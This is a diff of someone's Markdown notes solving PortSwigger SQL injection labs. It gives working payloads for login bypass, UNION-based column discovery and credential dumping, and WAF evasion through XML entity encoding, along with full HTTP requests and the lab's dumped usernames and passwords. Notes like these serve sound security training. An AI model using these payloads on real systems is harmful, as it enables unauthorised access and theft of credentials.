@@ -3,113 +3,100 @@ SQL injection: 3 Labs
 </span>
 https://portswigger.net/web-security/sql-injection
 
-# ***1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data***
-https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
+[SQL CH/SH](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
-**SQL server code**
-> SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+#
+# [***1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data***](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
 
-To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.  
+This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:
+```sql
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+```
+To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased. 
 
 <!-- **payload1**
     Accessories'--+-  // eliminating the release clause shows unreleased items -->
 
-**payload2**
-> '+OR+1=1--+-
+**payload**
+```sql
+'+OR+1=1--
+```
+#
+# [***2. Lab: SQL injection vulnerability allowing login bypass***](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
 
-# ***2. Lab: SQL injection vulnerability allowing login bypass***
-https://portswigger.net/web-security/sql-injection/lab-login-bypass
+This lab contains an SQL injection vulnerability in the login function.
 
 To solve the lab, perform an SQL injection attack that logs in to the application as the administrator user. 
 
 **payload:**
-> administrator'--
+```sql
+administrator'--
+```
 
-
-# ***3. Lab: SQL injection with filter bypass via XML encoding***
-https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding
-
-
-obfuscating hint in JSON:
-    <storeId>
-        999 &#x53;ELECT * FROM information_schema.tables
-    </storeId>
-
- The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.
-
-**Hint:** A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the Hackvertor extension to do this.
-
-1. check for number of columns and their support of string type values::
-> Union SELECT 'test' FROM information_schema.tables
-
-**request2**:
-> POST /product/stock HTTP/1.1
->
-> <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>4</productId><storeId>999 &#x75;nion &#x53;ELECT &apos;test&apos; FROM information_schema.tables</storeId></stockCheck>
-
-we know - 1 field, supports string
-
-2. payload to extract users and passwords:
-**request**
-> UNION SELECT username ||'  :   '|| password FROM users
-(note we cant use + signs instead of <space> since its xml not url...)
->POST /product/stock HTTP/1.1
->
-><?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>4</productId><storeId><@hex_entities>1 UNION SELECT username ||'~'|| password FROM users<@/hex_entities></storeId></stockCheck>
-
-response:
-> HTTP/1.1 200 OK
->
-> administrator  :   bxjt82k71f9xgi1ne864
-> 617 units
-> wiener  :   tsxcut3s6e27f2whmyzq
-> carlos  :   ywmmiqxmwkqqysur22fg
-
-# Lab solved!
-
+(see lab #3 below...)
 
 <span style="color:yellow;font-weight:700;font-size:30px">
 SQL injection UNION attacks
 </span>
+
 https://portswigger.net/web-security/sql-injection/union-attacks
 
+#
+# [***1. SQL injection UNION attack, determining the number of columns returned by the query***](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
 
-# ***1. SQL injection UNION attack, determining the number of columns returned by the query***
-https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
+This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.
 
 To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values. 
 
 
 **PayLoads to check**
+```
+UNION+SELECT+{NULL x ???}+FROM+information_schema.tables--+- 
+```
 
 **request 1:**
-> GET /filter?category=Pets'+UNION+SELECT+NULL+FROM+information_schema.tables--+- HTTP/1.1response:
+```
+GET /filter?category=Pets'+UNION+SELECT+NULL+FROM+information_schema.tables--+- HTTP/1.1
+```
 response:
-> HTTP/1.1 500 Internal Server Error
+```
+HTTP/1.1 500 Internal Server Error
+```
 
 **request 2:**
-> GET /filter?category=Pets'+UNION+SELECT+NULL,+NULL,FROM+information_schema.tables--+- HTTP/1.1
-Host: 
+```
+GET /filter?category=Pets'+UNION+SELECT+NULL,+NULL,FROM+information_schema.tables--+- HTTP/1.1
+``` 
 response:
-    HTTP/1.1 500 Internal Server Error
+```
+HTTP/1.1 500 Internal Server Error
+```
 
 **request 3:**
-> GET /filter?category=Pets'+UNION+SELECT+NULL+FROM+information_schema.tables--+- HTTP/1.1response:
+```
+GET /filter?category=Pets'+UNION+SELECT+NULL+FROM+information_schema.tables--+- HTTP/1.1
+```
 response:
-> HTTP/1.1 200 OK
-
+```
+HTTP/1.1 200 OK
+```
 since we had 3 NULL values we understand there are 3 columns in our original table
 
 **final payload**:
-> '+UNION+SELECT+NULL,+NULL,+NULL+FROM+information_schema.tables--+
+```
+'+UNION+SELECT+NULL,+NULL,+NULL+FROM+information_schema.tables--+
+```
 
+#
+# [***2. SQL injection UNION attack, finding a column containing text***](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
 
-# ***2. SQL injection UNION attack, finding a column containing text***
-https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
+This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.
 
-solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 
+The lab will provide a random value that you need to make appear within the query results. 
 
-**hint:** Make the database retrieve the string: 'g0cl1S'
+To solve  the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 
+
+**required::** Make the database retrieve the string: 'g0cl1S'
 
 after finding unmber of columns (see previous lab):
 ```
@@ -119,42 +106,54 @@ GET /filter?category=Gifts'+UNION+SELECT+NULL,+NULL,+NULL+FROM+information_schem
 we replace NULL value with random string provided: 'g0cl1S'
 
 **request1**:
-> GET /filter?category=Gifts'+UNION+SELECT+'g0cl1S',+NULL,+NULL+FROM+information_schema.tables--+ HTTP/1.1
+```
+GET /filter?category=Gifts'+UNION+SELECT+'g0cl1S',+NULL,+NULL+FROM+information_schema.tables--+ HTTP/1.1
+```
 response:
-> HTTP/1.1 500 Internal Server Error
+```
+HTTP/1.1 500 Internal Server Error
+```
 
 **request2**:
-> GET /filter?category=Gifts'+UNION+SELECT+NULL,+'g0cl1S',+NULL+FROM+information_schema.tables--+ HTTP/1.1
+```GET /filter?category=Gifts'+UNION+SELECT+NULL,+'g0cl1S',+NULL+FROM+information_schema.tables--+ HTTP/1.1
+```
 response:
-> HTTP/1.1 200 OK
-
+```
+HTTP/1.1 200 OK
+```
 ***(Lab solved!)***
 
-**request3**:
-> GET /filter?category=Gifts'+UNION+SELECT+NULL,+NULL,+'g0cl1S'+FROM+information_schema.tables--+ HTTP/1.1
-response:
-> HTTP/1.1 500 Internal Server Error
-
-only the second value reflect the string we entered - we know it supports string vslue and can be used to exfiltrate information. the other two cant be used for string value.
+only the second value reflect the string we entered - we know it supports string value and can be used to exfiltrate information. the other two cant be used for string value.
 
 **final PayLoad**
-> '+UNION+SELECT+NULL,'g0cl1S',NULL--+-
+```
+'+UNION+SELECT+NULL,'g0cl1S',NULL--+-
+```
+#
+# [***3. SQL injection UNION attack, retrieving data from other tables***](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
 
-
-# ***3. SQL injection UNION attack, retrieving data from other tables***
-https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
+This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs. 
 
 The database contains a different *table* called **users**, with *columns* called **username** and **password**. 
 
 To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 
 
 1. determine how many coloumns are in the current table:
->GET /filter?category=Lifestyle'+UNION+SELECT+NULL,+NULL+FROM+information_schema.tables--+ HTTP/1.1
-> HTTP/1.1 200 OK
+```
+GET /filter?category=Lifestyle'+UNION+SELECT+NULL,+NULL+FROM+information_schema.tables--+ HTTP/1.1
+```
+response:
+```
+HTTP/1.1 200 OK
+```
 
 2. determine how many of them support stroing values:
->GET /filter?category=Lifestyle'+UNION+SELECT+'test',+'test'+FROM+information_schema.tables--+ HTTP/1.1
-> HTTP/1.1 200 OK
+```
+GET /filter?category=Lifestyle'+UNION+SELECT+'test',+'test'+FROM+information_schema.tables--+ HTTP/1.1
+```
+```
+HTTP/1.1 200 OK
+```
 we see both fields can be used for information exfiltration
 
 3. exfiltrate usernames and passwords:
@@ -228,6 +227,76 @@ HTTP/1.1 200 OK
 '+UNION+SELECT+NULL,+username||'+:::+'||password+FROM+users--
 
 4. login to administrator account to solve the lab
+
+
+(from previous topic:)
+
+#
+# [***3. Lab: SQL injection with filter bypass via XML encoding***](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
+
+<!-- hint: obfuscating in JSON (*s* = *&#x53;*)
+```
+<storeId>
+    999 &#x53;ELECT * FROM information_schema.tables
+</storeId>
+``` -->
+
+This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a *UNION attack* to retrieve data from other tables.
+
+The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account. 
+
+**Hint:** A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the Hackvertor extension to do this.
+
+1. check for number of columns and their support of string type values using this payload:
+```sql
+Union SELECT 'test' FROM information_schema.tables 
+```
+
+**request1 (manually encoded)**:
+```
+POST /product/stock HTTP/1.1
+
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>4</productId><storeId>
+999 &#x75;nion &#x53;ELECT &apos;test&apos; FROM information_schema.tables
+</storeId></stockCheck>
+```
+**request2 (using hackvertor)**:
+```
+POST /product/stock HTTP/1.1
+
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>4</productId><storeId>
+<@html_entities>
+999 union SELECT NULL,NULL FROM information_schema.tables
+<@/html_entities>
+</storeId></stockCheck>
+```
+repeat this try with 2 'tests and see the payload fails
+now we know we have *1 field* in resualts and it *supports string*
+
+2. payload to extract users and passwords:
+**request**
+```sql
+UNION SELECT username ||'  :   '|| password FROM users
+```
+(note we cant use + signs instead of <space> since its xml not url...)
+```
+POST /product/stock HTTP/1.1
+
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>4</productId><storeId><@hex_entities>1 UNION SELECT username ||'~'|| password FROM users<@/hex_entities></storeId></stockCheck>
+```
+response:
+```
+HTTP/1.1 200 OK
+
+administrator  :   bxjt82k71f9xgi1ne864
+617 units
+wiener  :   tsxcut3s6e27f2whmyzq
+carlos  :   ywmmiqxmwkqqysur22fg
+
+```
+# Lab solved!
+
+
 
 # ***5. SQL injection attack, querying the database type and version on Oracle***
 https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
@@ -308,15 +377,14 @@ HTTP/1.1 200 OK
 ```
 **Lab solved**
 
-# ***7. SQL injection attack, listing the database contents on non-Oracle databases***
-https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
+# [***7. SQL injection attack, listing the database contents on non-Oracle databases***](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
 
  The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
 
 To solve the lab, log in as the administrator user. 
 
 1. determine how many coloumns are in the current table:
-> GET /filter?category=Lifestyle+UNION+SELECT+NULL,+NULL+FROM+information_schema.tables--+- HTTP/1.1
+> GET /filter?category=Lifestyle'+UNION+SELECT+NULL,+NULL+FROM+information_schema.tables--+- HTTP/1.1
 response:
 > HTTP/1.1 200 OK
 note the use of **--+-** instead of just **--**
